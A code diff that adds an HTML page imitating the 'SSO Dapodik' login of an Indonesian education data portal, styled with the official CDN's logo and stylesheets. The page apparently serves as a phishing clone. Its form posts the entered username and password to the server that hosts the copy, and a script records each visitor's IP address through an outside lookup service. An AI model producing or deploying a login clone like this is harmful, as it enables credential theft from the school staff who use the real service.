@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en" class="metro-no-touch-device">
+<link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
+<link type="text/css" rel="stylesheet" id="dark-mode-general-link">
+<style lang="en" type="text/css" id="dark-mode-custom-style"></style>
+<style lang="en" type="text/css" id="dark-mode-native-style"></style>
+<style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <title>SSO Dapodik - PTK Dapodik</title>
+    <link rel="shortcut icon" href="https://cdn-dapodik.kemdikbud.go.id/sp/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://cdn-dapodik.kemdikbud.go.id/sp/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn-dapodik.kemdikbud.go.id/sso/static/css/metro-all.min.css">
+    <link rel="stylesheet" href="https://cdn-dapodik.kemdikbud.go.id/sso/static/css/apps.css">
+    <script src="https://cdn-dapodik.kemdikbud.go.id/sso/static/js/metro.min.js"></script>
+    <style></style>
+</head>
+
+<body class="h-vh-100 d-flex flex-justify-center flex-align-center" style="opacity: 1;">
+
+    <style>
+        #ssoauth {
+            background: #FFF url('https://cdn-dapodik.kemdikbud.go.id/sso/static/images/logo120.png') no-repeat 100% -10px
+        }
+
+        .info-box .closer {
+            background-color: transparent !important;
+        }
+    </style>
+    <div class="login-box">
+        <form id="ssoauth" class="bg-white p-4" method="post" action="" data-role="validator" data-clear-invalid="2000"
+            data-on-submit="kirimLogin" novalidate="novalidate" data-role-validator="true">
+            <h1 class="mb-0">Dapodik</h1>
+            <div class="text-muted mb-4 fg-dark">autentikasi pengguna PTK Dapodik</div>
+            <div class="form-group">
+                <div class="input required"><input type="text" name="usrname" data-role="input" placeholder="Username"
+                        data-append="<span class='mif-envelop'>" data-validate="required email maxlength=60" class=""
+                        data-role-input="true">
+                    <div class="button-group"><button class="button input-clear-button" tabindex="-1"
+                            type="button"><span class="default-icon-cross"></span></button></div>
+                    <div class="append"><span class="mif-envelop"></span></div>
+                </div>
+                <span class="invalid_feedback">Mohon menggunakan email yang valid</span>
+            </div>
+            <div class="form-group">
+                <div class="input required"><input type="password" name="passwd" data-role="input"
+                        placeholder="Password" data-append="<span class='mif-key'>" data-validate="required"
+                        autocomplete="off" class="" data-role-input="true">
+                    <div class="button-group"><button class="button input-clear-button" tabindex="-1"
+                            type="button"><span class="default-icon-cross"></span></button><button
+                            class="button input-reveal-button" tabindex="-1" type="button"><span
+                                class="default-icon-eye"></span></button></div>
+                    <div class="append"><span class="mif-key"></span></div>
+                </div>
+                <span class="invalid_feedback">Password harus diisi</span>
+            </div>
+            <div class="form-group d-flex flex-align-center flex-justify-between">
+                <input type="hidden" name="usraddr" id="usraddr" value="118.98.214.44">
+                <input type="hidden" name="g-recaptcha-response" id="g-recaptcha-response" value="">
+                <button id="cmdMasuk" class="button primary">Masuk</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        $.json('https://api.ipify.org?format=json').then(
+            function (response) {
+                $('#usraddr').val(response.ip);
+            }
+        )
+        function kirimLogin() {
+            $('#ssoauth').submit();
+        }
+
+    </script>
+
+
+</body>
+
+</html>
+</!DOCTYPE>
